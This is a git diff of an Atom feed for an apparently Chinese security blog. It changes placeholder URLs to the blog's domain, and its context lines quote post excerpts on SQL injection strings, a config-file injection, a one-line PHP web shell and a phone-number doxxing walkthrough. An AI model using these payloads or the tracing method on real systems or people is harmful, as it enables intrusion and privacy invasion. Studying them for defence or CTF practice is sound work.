@@ -3,9 +3,9 @@
   <title><![CDATA[FreeV's Blog]]></title>
   
   <link href="/atom.xml" rel="self"/>
-  <link href="http://yoursite.com/"/>
+  <link href="http://www.freev.cc/"/>
   <updated>2017-05-01T14:36:52.000Z</updated>
-  <id>http://yoursite.com/</id>
+  <id>http://www.freev.cc/</id>
   
   <author>
     <name><![CDATA[FreeV]]></name>
@@ -16,8 +16,8 @@
   
   <entry>
     <title><![CDATA[另一种信息收集技巧]]></title>
-    <link href="http://yoursite.com/2017/05/01/%E5%8F%A6%E4%B8%80%E7%A7%8D%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%8A%80%E5%B7%A7/"/>
-    <id>http://yoursite.com/2017/05/01/另一种信息收集技巧/</id>
+    <link href="http://www.freev.cc/2017/05/01/%E5%8F%A6%E4%B8%80%E7%A7%8D%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%8A%80%E5%B7%A7/"/>
+    <id>http://www.freev.cc/2017/05/01/另一种信息收集技巧/</id>
     <published>2017-05-01T12:04:32.000Z</published>
     <updated>2017-05-01T14:36:52.000Z</updated>
     <content type="html"><![CDATA[<h2 id="0x00__u5229_u7528"><a href="#0x00__u5229_u7528" class="headerlink" title="0x00 利用"></a>0x00 利用</h2><p>原理很简单，不多说了吧，大家一看就懂了。通过邮箱系统或者留言管理之类的系统插入一个允许的图片链接，一个你自己的外网服务器的链接就可以，然后等待对方打开你的链接，通过img 标签的src特性会自动请求你的链接，这事你可以通过apache日志查看对方请求的信息，</p>
@@ -48,14 +48,14 @@
     
     </summary>
     
-      <category term="信息收集" scheme="http://yoursite.com/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
+      <category term="信息收集" scheme="http://www.freev.cc/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
     
   </entry>
   
   <entry>
     <title><![CDATA[powershell渗透中的应用]]></title>
-    <link href="http://yoursite.com/2017/02/16/powershell%E6%B8%97%E9%80%8F%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/"/>
-    <id>http://yoursite.com/2017/02/16/powershell渗透中的应用/</id>
+    <link href="http://www.freev.cc/2017/02/16/powershell%E6%B8%97%E9%80%8F%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/"/>
+    <id>http://www.freev.cc/2017/02/16/powershell渗透中的应用/</id>
     <published>2017-02-16T12:28:57.000Z</published>
     <updated>2017-02-17T09:16:10.651Z</updated>
     <content type="html"><![CDATA[<h2 id="0x00__u4ECB_u7ECD"><a href="#0x00__u4ECB_u7ECD" class="headerlink" title="0x00 介绍"></a>0x00 介绍</h2><pre><code>powershell 脚本默认无法在cmd直接运行，处于安全考虑微软程序员设置了PowerShell Execution Policy
@@ -71,14 +71,14 @@
     
     </summary>
     
-      <category term="渗透技巧" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7/"/>
+      <category term="渗透技巧" scheme="http://www.freev.cc/tags/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7/"/>
     
   </entry>
   
   <entry>
     <title><![CDATA[一次审计中遇到的问题]]></title>
-    <link href="http://yoursite.com/2016/12/06/%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1%E4%B8%AD%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98/"/>
-    <id>http://yoursite.com/2016/12/06/一次审计中遇到的问题/</id>
+    <link href="http://www.freev.cc/2016/12/06/%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1%E4%B8%AD%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98/"/>
+    <id>http://www.freev.cc/2016/12/06/一次审计中遇到的问题/</id>
     <published>2016-12-06T07:08:36.000Z</published>
     <updated>2016-12-06T08:25:47.960Z</updated>
     <content type="html"><![CDATA[<h1 id="0x01__u67D0crm"><a href="#0x01__u67D0crm" class="headerlink" title="0x01 某crm"></a>0x01 某crm</h1><p>这个漏洞之前提交过，厂商不再关注了。就跟大家分享一下：因为现在很多企业，学校都再用，就不说厂商名字了。<br>代码是混淆过的，不过没关系，把eval 换成echo。运行 也会echo出源码。默认mysql链接字符集是gbk这很关键。直接导致宽字节注入。<br>密码验证函数是crypt。crypt是php自带的函数。自行百度吧。<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">function logincheck($username,$password)							&#123;</span><br><span class="line">trueglobal $db,$表前缀;</span><br><span class="line">true$SQL		= "SELECT * FROM ".$表前缀."user WHERE USER_ID = '$username'";</span><br><span class="line">true$rs			= $db-&gt;Execute($SQL);</span><br><span class="line">true$rs_a		= $rs-&gt;GetArray();</span><br><span class="line">true$USER_ID	= $rs_a[0]['USER_ID'];</span><br><span class="line">true$PASSWORDTEXT = $rs_a[0]['PASSWORD'];</span><br><span class="line">true//print crypt('', $PASSWORDTEXT) == $PASSWORDTEXT;</span><br><span class="line">true//print_R($password);print_R($PASSWORDTEXT);exit;</span><br><span class="line">trueif($USER_ID!="")												&#123;</span><br><span class="line">truetrueif(crypt($password,$PASSWORDTEXT) == $PASSWORDTEXT)			&#123;</span><br><span class="line">truetruetrue//密码正确</span><br><span class="line">truetruetruereturn $rs_a;</span><br><span class="line">truetruetrueexit;</span><br><span class="line">truetrue&#125;</span><br><span class="line">truetrueelse	&#123;</span><br><span class="line">truetruetrue//密码错误</span><br><span class="line">truetruetrue//print_R($password);print_R($username);exit;</span><br><span class="line">truetruetrueecho "&lt;META HTTP-EQUIV=REFRESH CONTENT='0;URL=notchecked.php'&gt;\n";</span><br><span class="line">truetruetrueexit;</span><br><span class="line">truetrue&#125;</span><br><span class="line">true&#125;</span><br><span class="line">trueelse	&#123;</span><br><span class="line">truetrue//用户名不存在</span><br><span class="line">truetrue//print_R($password);print_R($_POST);exit;</span><br><span class="line">truetrueecho "&lt;META HTTP-EQUIV=REFRESH CONTENT='0;URL=notchecked.php'&gt;\n";</span><br><span class="line">truetrueexit;</span><br><span class="line">true&#125;</span><br><span class="line">trueexit;</span><br></pre></td></tr></table></figure></p>
@@ -92,14 +92,14 @@ select</code></p>
     
     </summary>
     
-      <category term="代码审计" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
+      <category term="代码审计" scheme="http://www.freev.cc/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
     
   </entry>
   
   <entry>
     <title><![CDATA[社工实战]]></title>
-    <link href="http://yoursite.com/2016/12/06/%E7%A4%BE%E5%B7%A5%E5%AE%9E%E6%88%98/"/>
-    <id>http://yoursite.com/2016/12/06/社工实战/</id>
+    <link href="http://www.freev.cc/2016/12/06/%E7%A4%BE%E5%B7%A5%E5%AE%9E%E6%88%98/"/>
+    <id>http://www.freev.cc/2016/12/06/社工实战/</id>
     <published>2016-12-06T05:51:11.000Z</published>
     <updated>2016-12-06T06:54:40.195Z</updated>
     <content type="html"><![CDATA[<h1 id="0x00__u5B9E_u6218"><a href="#0x00__u5B9E_u6218" class="headerlink" title="0x00 实战"></a>0x00 实战</h1><p>帮同学查的一个人，信息就是一个电话号：1863038<em>**</em><br>先看看手机号都注册了那些东西<br><img src="1.png" alt="Alt text"><br>收集注册通信社交软件信息：<br>qq手机号搜出以下信息。然后通过qq网名搜索qq号,信息就出来了如图：<br><img src="./12.png" width="300" height="200" alt=""><img src="./13.png" width="300" height="200" alt=""><br><img src="./14.png" width="300" height="200" alt=""><br>微博：我先在微博搜索的qq网名。微信名等。未发现什么有用信息。后来想到支付宝实名。<br><img src="./15.png" width="300" height="200" alt=""></p>
@@ -113,14 +113,14 @@ select</code></p>
     
     </summary>
     
-      <category term="社会工程学" scheme="http://yoursite.com/tags/%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6/"/>
+      <category term="社会工程学" scheme="http://www.freev.cc/tags/%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6/"/>
     
   </entry>
   
   <entry>
     <title><![CDATA[sql注入梳理（1）]]></title>
-    <link href="http://yoursite.com/2016/10/27/sql%E6%B3%A8%E5%85%A5%E6%A2%B3%E7%90%86%EF%BC%881%EF%BC%89/"/>
-    <id>http://yoursite.com/2016/10/27/sql注入梳理（1）/</id>
+    <link href="http://www.freev.cc/2016/10/27/sql%E6%B3%A8%E5%85%A5%E6%A2%B3%E7%90%86%EF%BC%881%EF%BC%89/"/>
+    <id>http://www.freev.cc/2016/10/27/sql注入梳理（1）/</id>
     <published>2016-10-27T11:53:48.000Z</published>
     <updated>2016-10-29T15:13:20.202Z</updated>
     <content type="html"><![CDATA[<p>判断数据库;<br>    mysql    and length(2)=1  char_length(1)=1<br>    mssql   and len(1)=1  DATALENGTH<br>    oracle and lengthb(1)=1</p>
@@ -142,8 +142,8 @@ select * from admin where id =&apos;123&apos; and substr((select flag from flag 
   
   <entry>
     <title><![CDATA[php随机数函数安全]]></title>
-    <link href="http://yoursite.com/2016/09/12/php%E9%9A%8F%E6%9C%BA%E6%95%B0%E5%87%BD%E6%95%B0%E5%AE%89%E5%85%A8/"/>
-    <id>http://yoursite.com/2016/09/12/php随机数函数安全/</id>
+    <link href="http://www.freev.cc/2016/09/12/php%E9%9A%8F%E6%9C%BA%E6%95%B0%E5%87%BD%E6%95%B0%E5%AE%89%E5%85%A8/"/>
+    <id>http://www.freev.cc/2016/09/12/php随机数函数安全/</id>
     <published>2016-09-12T08:53:34.000Z</published>
     <updated>2016-12-06T05:44:09.487Z</updated>
     <content type="html"><![CDATA[<h1 id="0x00_rand_28_29_u51FD_u6570"><a href="#0x00_rand_28_29_u51FD_u6570" class="headerlink" title="0x00 rand()函数"></a>0x00 rand()函数</h1><p>rand()的随机数默认最大32767，可以用于爆破这里不再举例。</p>
@@ -159,14 +159,14 @@ select * from admin where id =&apos;123&apos; and substr((select flag from flag 
     
     </summary>
     
-      <category term="代码审计" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
+      <category term="代码审计" scheme="http://www.freev.cc/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
     
   </entry>
   
   <entry>
     <title><![CDATA[sql注入之最短姿势]]></title>
-    <link href="http://yoursite.com/2016/09/10/sql%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%9C%80%E7%9F%AD%E5%A7%BF%E5%8A%BF/"/>
-    <id>http://yoursite.com/2016/09/10/sql注入之最短姿势/</id>
+    <link href="http://www.freev.cc/2016/09/10/sql%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%9C%80%E7%9F%AD%E5%A7%BF%E5%8A%BF/"/>
+    <id>http://www.freev.cc/2016/09/10/sql注入之最短姿势/</id>
     <published>2016-09-10T06:07:34.000Z</published>
     <updated>2016-09-12T08:51:17.134Z</updated>
     <content type="html"><![CDATA[<h2 id="0x00__u59FF_u52BF"><a href="#0x00__u59FF_u52BF" class="headerlink" title="0x00 姿势"></a>0x00 姿势</h2><p>select <em> from user where id=’’=0# and password=’ad’<br>select </em> from user where id=’’ 返回为空 相当于0=0，即绕过了长短问题</p>
@@ -181,14 +181,14 @@ select * from admin where id =&apos;123&apos; and substr((select flag from flag 
     
     </summary>
     
-      <category term="sql注入" scheme="http://yoursite.com/tags/sql%E6%B3%A8%E5%85%A5/"/>
+      <category term="sql注入" scheme="http://www.freev.cc/tags/sql%E6%B3%A8%E5%85%A5/"/>
     
   </entry>
   
   <entry>
     <title><![CDATA[ctf之压缩文件]]></title>
-    <link href="http://yoursite.com/2016/09/08/ctf%E4%B9%8B%E5%8E%8B%E7%BC%A9%E6%96%87%E4%BB%B6/"/>
-    <id>http://yoursite.com/2016/09/08/ctf之压缩文件/</id>
+    <link href="http://www.freev.cc/2016/09/08/ctf%E4%B9%8B%E5%8E%8B%E7%BC%A9%E6%96%87%E4%BB%B6/"/>
+    <id>http://www.freev.cc/2016/09/08/ctf之压缩文件/</id>
     <published>2016-09-08T06:52:32.000Z</published>
     <updated>2016-10-05T07:50:54.707Z</updated>
     <content type="html"><![CDATA[<h2 id="0x00_ZIP_u6587_u4EF6_u4F2A_u52A0_u5BC6"><a href="#0x00_ZIP_u6587_u4EF6_u4F2A_u52A0_u5BC6" class="headerlink" title="0x00 ZIP文件伪加密"></a>0x00 ZIP文件伪加密</h2><p>用ue16进制打开zip文件后，50 4B 01 02 3F 00 14 00 0*改成  50 4B 01 02 3F 00 14 00 01即完成加密</p>
@@ -202,14 +202,14 @@ select * from admin where id =&apos;123&apos; and substr((select flag from flag 
     <![CDATA[<h2 id="0x00_ZIP_u6587_u4EF6_u4F2A_u52A0_u5BC6"><a href="#0x00_ZIP_u6587_u4EF6_u4F2A_u52A0_u5BC6" class="headerlink" title="0x00 ZIP文件伪加密"><]]>
     </summary>
     
-      <category term="隐写" scheme="http://yoursite.com/tags/%E9%9A%90%E5%86%99/"/>
+      <category term="隐写" scheme="http://www.freev.cc/tags/%E9%9A%90%E5%86%99/"/>
     
   </entry>
   
   <entry>
     <title><![CDATA[ctf之隐写工具篇]]></title>
-    <link href="http://yoursite.com/2016/09/08/ctf%E4%B9%8B%E9%9A%90%E5%86%99%E5%B7%A5%E5%85%B7%E7%AF%87/"/>
-    <id>http://yoursite.com/2016/09/08/ctf之隐写工具篇/</id>
+    <link href="http://www.freev.cc/2016/09/08/ctf%E4%B9%8B%E9%9A%90%E5%86%99%E5%B7%A5%E5%85%B7%E7%AF%87/"/>
+    <id>http://www.freev.cc/2016/09/08/ctf之隐写工具篇/</id>
     <published>2016-09-08T05:33:35.000Z</published>
     <updated>2016-10-06T03:27:11.841Z</updated>
     <content type="html"><![CDATA[<h2 id="0x00_Stegdetect"><a href="#0x00_Stegdetect" class="headerlink" title="0x00 Stegdetect"></a>0x00 Stegdetect</h2><p>Stegdetect程序主要用于分析JPEG文件，可以检测到通过JSteg、JPHide、OutGuess、Invisible Secrets、F5、appendX和Camouflage等这些隐写工具隐藏的信息</p>
@@ -245,14 +245,14 @@ i – 检测图像中的信息是否是用invisible secrets嵌入的。
     
     </summary>
     
-      <category term="隐写" scheme="http://yoursite.com/tags/%E9%9A%90%E5%86%99/"/>
+      <category term="隐写" scheme="http://www.freev.cc/tags/%E9%9A%90%E5%86%99/"/>
     
   </entry>
   
   <entry>
     <title><![CDATA[ctf之图片隐写总结]]></title>
-    <link href="http://yoursite.com/2016/09/02/ctf%E4%B9%8B%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E6%80%BB%E7%BB%93/"/>
-    <id>http://yoursite.com/2016/09/02/ctf之图片隐写总结/</id>
+    <link href="http://www.freev.cc/2016/09/02/ctf%E4%B9%8B%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E6%80%BB%E7%BB%93/"/>
+    <id>http://www.freev.cc/2016/09/02/ctf之图片隐写总结/</id>
     <published>2016-09-02T07:51:58.000Z</published>
     <updated>2016-09-10T06:15:38.512Z</updated>
     <content type="html"><![CDATA[<h2 id="0x00_BMP_u6587_u4EF6_u683C_u5F0F"><a href="#0x00_BMP_u6587_u4EF6_u683C_u5F0F" class="headerlink" title="0x00 BMP文件格式"></a>0x00 BMP文件格式</h2><p>关于BMP文件的详细格式信息请看这个链接<br><a href="http://www.cnblogs.com/tiandsp/archive/2012/10/22/2734552.html" target="_blank" rel="external">http://www.cnblogs.com/tiandsp/archive/2012/10/22/2734552.html</a><br>BMP文件的数据按照从文件头开始的先后顺序分为四个部分：<br>◆ 位图文件头(bmp file header)：  提供文件的格式、大小等信息<br>◆ 位图信息头(bitmap information)：提供图像数据的尺寸、位平面数、压缩方式、颜色索引等信息<br>◆ 调色板(color palette)：可选，如使用索引来表示图像，调色板就是索引与其对应的颜色的映射表<br>◆ 位图数据(bitmap data)：图像数据区</p>
@@ -266,14 +266,14 @@ i – 检测图像中的信息是否是用invisible secrets嵌入的。
     <![CDATA[<h2 id="0x00_BMP_u6587_u4EF6_u683C_u5F0F"><a href="#0x00_BMP_u6587_u4EF6_u683C_u5F0F" class="headerlink" title="0x00 BMP文件格式"></a>0x00 BMP文件]]>
     </summary>
     
-      <category term="隐写" scheme="http://yoursite.com/tags/%E9%9A%90%E5%86%99/"/>
+      <category term="隐写" scheme="http://www.freev.cc/tags/%E9%9A%90%E5%86%99/"/>
     
   </entry>
   
   <entry>
     <title><![CDATA[RSA公钥密码算法原理以及安全性]]></title>
-    <link href="http://yoursite.com/2016/08/09/RSA%E5%85%AC%E9%92%A5%E5%AF%86%E7%A0%81%E7%AE%97%E6%B3%95%E5%8E%9F%E7%90%86%E4%BB%A5%E5%8F%8A%E5%AE%89%E5%85%A8%E6%80%A7/"/>
-    <id>http://yoursite.com/2016/08/09/RSA公钥密码算法原理以及安全性/</id>
+    <link href="http://www.freev.cc/2016/08/09/RSA%E5%85%AC%E9%92%A5%E5%AF%86%E7%A0%81%E7%AE%97%E6%B3%95%E5%8E%9F%E7%90%86%E4%BB%A5%E5%8F%8A%E5%AE%89%E5%85%A8%E6%80%A7/"/>
+    <id>http://www.freev.cc/2016/08/09/RSA公钥密码算法原理以及安全性/</id>
     <published>2016-08-09T08:12:37.000Z</published>
     <updated>2016-09-02T06:16:55.048Z</updated>
     <content type="html"><![CDATA[<h2 id="0x00_RSA_u539F_u7406_u5206_u6790"><a href="#0x00_RSA_u539F_u7406_u5206_u6790" class="headerlink" title="0x00 RSA原理分析"></a>0x00 RSA原理分析</h2><p>关于rsa算法的历史这里不再介绍，直接看重点。rsa可以用做公钥密码和数字签名，首先你得知道他是一个公钥加密算法，公钥加密<br>的密钥分为加密的密钥和解密的密钥，也就是公钥和私钥，公钥可以公开的密钥，私钥用作解密的密钥。<br>一,关键词：<br>公钥：数E 和N<br>私钥：数D 和N<br>加密 E次方的mod n<br>解密 D次方mod n<br>具体步骤：<br>1，求N<br>2，求L（在rsa加密解密过程中不出现，而是出现在生成密钥对的过程中）<br>3，求E<br>4，求D<br>二，详细步骤：<br>1，生成p和q为两个大质数，<br>2，N为两数乘积<br>3，L的p-1和q-1的最小公倍数<br>4，E是个比1大比L小的数，且e和L 的最大公约数必须为1<br>5，D是由数E计算得到的,满足1&lt;D&lt;L </p>
@@ -290,14 +290,14 @@ i – 检测图像中的信息是否是用invisible secrets嵌入的。
     <![CDATA[<h2 id="0x00_RSA_u539F_u7406_u5206_u6790"><a href="#0x00_RSA_u539F_u7406_u5206_u6790" class="headerlink" title="0x00 RSA原理分析"></a>0x00 RSA原理]]>
     </summary>
     
-      <category term="加密解密" scheme="http://yoursite.com/tags/%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86/"/>
+      <category term="加密解密" scheme="http://www.freev.cc/tags/%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86/"/>
     
   </entry>
   
   <entry>
     <title><![CDATA[git泄漏批量实现]]></title>
-    <link href="http://yoursite.com/2016/05/09/git%E6%B3%84%E6%BC%8F%E6%89%B9%E9%87%8F%E5%AE%9E%E7%8E%B0/"/>
-    <id>http://yoursite.com/2016/05/09/git泄漏批量实现/</id>
+    <link href="http://www.freev.cc/2016/05/09/git%E6%B3%84%E6%BC%8F%E6%89%B9%E9%87%8F%E5%AE%9E%E7%8E%B0/"/>
+    <id>http://www.freev.cc/2016/05/09/git泄漏批量实现/</id>
     <published>2016-05-09T04:40:00.000Z</published>
     <updated>2016-09-02T06:16:16.234Z</updated>
     <content type="html"><![CDATA[<h2 id="0x00__u6F0F_u6D1E_u5206_u6790"><a href="#0x00__u6F0F_u6D1E_u5206_u6790" class="headerlink" title="0x00 漏洞分析"></a>0x00 漏洞分析</h2><p>随意代码托管给程序员带来的方便，git泄露也随之普遍，包括一个大厂商判断也简单，<a href="http://www.baidu.com/.git/index" target="_blank" rel="external">http://www.baidu.com/.git/index</a> 如果存在就可以利用了，<br>可以利用工具，审计源码，拿到shell</p>
@@ -310,14 +310,14 @@ i – 检测图像中的信息是否是用invisible secrets嵌入的。
     <![CDATA[<h2 id="0x00__u6F0F_u6D1E_u5206_u6790"><a href="#0x00__u6F0F_u6D1E_u5206_u6790" class="headerlink" title="0x00 漏洞分析"></a>0x00 漏洞分析</h2><p>随意]]>
     </summary>
     
-      <category term="python" scheme="http://yoursite.com/tags/python/"/>
+      <category term="python" scheme="http://www.freev.cc/tags/python/"/>
     
   </entry>
   
   <entry>
     <title><![CDATA[pyhton多线程批量ftp未授权访问漏洞]]></title>
-    <link href="http://yoursite.com/2016/04/11/pyhton%E5%A4%9A%E7%BA%BF%E7%A8%8B%E6%89%B9%E9%87%8Fftp%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"/>
-    <id>http://yoursite.com/2016/04/11/pyhton多线程批量ftp未授权访问漏洞/</id>
+    <link href="http://www.freev.cc/2016/04/11/pyhton%E5%A4%9A%E7%BA%BF%E7%A8%8B%E6%89%B9%E9%87%8Fftp%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"/>
+    <id>http://www.freev.cc/2016/04/11/pyhton多线程批量ftp未授权访问漏洞/</id>
     <published>2016-04-11T13:32:32.000Z</published>
     <updated>2016-09-02T06:16:52.224Z</updated>
     <content type="html"><![CDATA[<h2 id="0x00__u6F0F_u6D1E_u5206_u6790"><a href="#0x00__u6F0F_u6D1E_u5206_u6790" class="headerlink" title="0x00 漏洞分析"></a>0x00 漏洞分析</h2><p>ftp未授权访问是一个很老的漏洞了,现在包括vsftp在内的很多主流的ftp软件都默认配置都存在这个漏洞，不过在linux下vsftp默认配置没有上传权限，只有读的权限，也就是说如果管理员装有vsftp并且没有进行配置，那么那就有机会观赏网站的源码了，<br>如果在windows中好多网站还是可以直接上传shell的，所谓的ftp未授权就是ftp匿名登录。关于vsftp配置相关文章：<br><a href="http://www.osyunwei.com/archives/9006.html" target="_blank" rel="external">http://www.osyunwei.com/archives/9006.html</a><br><a href="http://www.cnblogs.com/JemBai/archive/2009/02/05/1384413.html" target="_blank" rel="external">http://www.cnblogs.com/JemBai/archive/2009/02/05/1384413.html</a></p>
@@ -330,14 +330,14 @@ i – 检测图像中的信息是否是用invisible secrets嵌入的。
     <![CDATA[<h2 id="0x00__u6F0F_u6D1E_u5206_u6790"><a href="#0x00__u6F0F_u6D1E_u5206_u6790" class="headerlink" title="0x00 漏洞分析"></a>0x00 漏洞分析</h2><p>ft]]>
     </summary>
     
-      <category term="python" scheme="http://yoursite.com/tags/python/"/>
+      <category term="python" scheme="http://www.freev.cc/tags/python/"/>
     
   </entry>
   
   <entry>
     <title><![CDATA[后台配置getshell总结]]></title>
-    <link href="http://yoursite.com/2016/02/06/%E5%90%8E%E5%8F%B0%E9%85%8D%E7%BD%AEgetshell%E6%80%BB%E7%BB%93/"/>
-    <id>http://yoursite.com/2016/02/06/后台配置getshell总结/</id>
+    <link href="http://www.freev.cc/2016/02/06/%E5%90%8E%E5%8F%B0%E9%85%8D%E7%BD%AEgetshell%E6%80%BB%E7%BB%93/"/>
+    <id>http://www.freev.cc/2016/02/06/后台配置getshell总结/</id>
     <published>2016-02-06T11:03:24.000Z</published>
     <updated>2016-09-02T06:16:58.501Z</updated>
     <content type="html"><![CDATA[<h2 id="0x00__u914D_u7F6E_u6587_u4EF6_u5355_u5F15_u53F7"><a href="#0x00__u914D_u7F6E_u6587_u4EF6_u5355_u5F15_u53F7" class="headerlink" title="0x00 配置文件单引号"></a>0x00 配置文件单引号</h2><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">    <span class="variable">$host</span>=<span class="string">'127.0.0.1'</span>;</span><br><span class="line">    <span class="variable">$uncode</span>=<span class="string">'1'</span>;</span><br><span class="line">    <span class="variable">$username</span>=<span class="string">'xx'</span>;</span><br><span class="line">    <span class="variable">$upload</span>=<span class="string">'a'</span>;</span><br><span class="line">?&gt;</span><br><span class="line">   //利用反斜杠转义第二个单引号  利用‘//‘注释后面语句</span><br><span class="line">&lt;?php </span><br><span class="line">    <span class="variable">$host</span>=<span class="string">'127.0.0.1\'</span>;</span><br><span class="line">    <span class="variable">$uncode</span>=<span class="string">';echo '</span><span class="number">1</span><span class="string">';//11'</span>;</span><br><span class="line">    <span class="variable">$username</span>=<span class="string">'xx'</span>;</span><br><span class="line">    <span class="variable">$upload</span>=<span class="string">'a'</span>;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
@@ -350,14 +350,14 @@ i – 检测图像中的信息是否是用invisible secrets嵌入的。
     
     </summary>
     
-      <category term="渗透技巧" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7/"/>
+      <category term="渗透技巧" scheme="http://www.freev.cc/tags/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7/"/>
     
   </entry>
   
   <entry>
     <title><![CDATA[一个php木马引发的xxoo]]></title>
-    <link href="http://yoursite.com/2016/01/30/%E4%B8%80%E4%B8%AAphp%E6%9C%A8%E9%A9%AC%E5%BC%95%E5%8F%91%E7%9A%84xxoo/"/>
-    <id>http://yoursite.com/2016/01/30/一个php木马引发的xxoo/</id>
+    <link href="http://www.freev.cc/2016/01/30/%E4%B8%80%E4%B8%AAphp%E6%9C%A8%E9%A9%AC%E5%BC%95%E5%8F%91%E7%9A%84xxoo/"/>
+    <id>http://www.freev.cc/2016/01/30/一个php木马引发的xxoo/</id>
     <published>2016-01-30T01:27:25.000Z</published>
     <updated>2016-09-02T06:16:56.950Z</updated>
     <content type="html"><![CDATA[<h2 id="0x00__u5076_u9047php_u9A6C"><a href="#0x00__u5076_u9047php_u9A6C" class="headerlink" title="0x00 偶遇php马"></a>0x00 偶遇php马</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="preprocessor">&lt;?</span>=`<span class="variable">$_GET</span>[<span class="number">1</span>]`;</span><br><span class="line">&lt;% <span class="keyword">echo</span> `<span class="variable">$_GET</span>[<span class="number">1</span>]`%&gt;</span></span><br></pre></td></tr></table></figure>
@@ -376,14 +376,14 @@ i – 检测图像中的信息是否是用invisible secrets嵌入的。
     <![CDATA[<h2 id="0x00__u5076_u9047php_u9A6C"><a href="#0x00__u5076_u9047php_u9A6C" class="headerlink" title="0x00 偶遇php马"></a>0x00 偶遇php马</h2><figure]]>
     </summary>
     
-      <category term="php代码安全" scheme="http://yoursite.com/tags/php%E4%BB%A3%E7%A0%81%E5%AE%89%E5%85%A8/"/>
+      <category term="php代码安全" scheme="http://www.freev.cc/tags/php%E4%BB%A3%E7%A0%81%E5%AE%89%E5%85%A8/"/>
     
   </entry>
   
   <entry>
     <title><![CDATA[上传之万恶的zip]]></title>
-    <link href="http://yoursite.com/2015/12/16/%E4%B8%8A%E4%BC%A0%E4%B9%8B%E4%B8%87%E6%81%B6%E7%9A%84zip/"/>
-    <id>http://yoursite.com/2015/12/16/上传之万恶的zip/</id>
+    <link href="http://www.freev.cc/2015/12/16/%E4%B8%8A%E4%BC%A0%E4%B9%8B%E4%B8%87%E6%81%B6%E7%9A%84zip/"/>
+    <id>http://www.freev.cc/2015/12/16/上传之万恶的zip/</id>
     <published>2015-12-16T03:46:22.000Z</published>
     <updated>2016-09-02T06:16:57.777Z</updated>
     <content type="html"><![CDATA[<h2 id="0x00_zip_u6587_u4EF6_u7ED3_u6784"><a href="#0x00_zip_u6587_u4EF6_u7ED3_u6784" class="headerlink" title="0x00 zip文件结构"></a>0x00 zip文件结构</h2><p>1,找一张图片命令xxx11.jpg然后压缩</p>
@@ -435,14 +435,14 @@ i – 检测图像中的信息是否是用invisible secrets嵌入的。
     <![CDATA[<h2 id="0x00_zip_u6587_u4EF6_u7ED3_u6784"><a href="#0x00_zip_u6587_u4EF6_u7ED3_u6784" class="headerlink" title="0x00 zip文件结构"></a>0x00 zip文件]]>
     </summary>
     
-      <category term="渗透技巧" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7/"/>
+      <category term="渗透技巧" scheme="http://www.freev.cc/tags/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7/"/>
     
   </entry>
   
   <entry>
     <title><![CDATA[php高级图片隐藏马]]></title>
-    <link href="http://yoursite.com/2015/12/11/php%E9%AB%98%E7%BA%A7%E5%9B%BE%E7%89%87%E9%9A%90%E8%97%8F%E9%A9%AC/"/>
-    <id>http://yoursite.com/2015/12/11/php高级图片隐藏马/</id>
